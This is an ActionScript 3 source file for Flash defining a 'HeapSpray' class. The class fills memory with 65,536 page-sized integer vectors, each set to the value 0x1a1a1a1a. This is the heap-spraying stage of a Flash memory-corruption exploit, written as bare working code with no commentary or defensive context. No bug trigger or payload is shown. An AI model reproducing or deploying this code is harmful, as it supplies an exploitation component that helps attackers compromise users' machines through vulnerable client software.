package
{
	
	import flash.display.*;
	
	public class HeapSpray extends Sprite
	{
		
		public var s:Vector.<Object>;
		
		public function HeapSpray()
		{
			
			
			var len:int = 0;
			var i:int = 0;
			/* Spray the integer vectors */
			this.s = new Vector.<Object>(0x10000); 
			while (len < 0x10000)
			{
				this.s[len] = new Vector.<uint>(0x1000 / 4 - 2);
				for (i=0; i < this.s[len].length; i++)
				{
					this.s[len][i] = 0x1a1a1a1a;
				}
				++len;
			}				
		}
	}
}
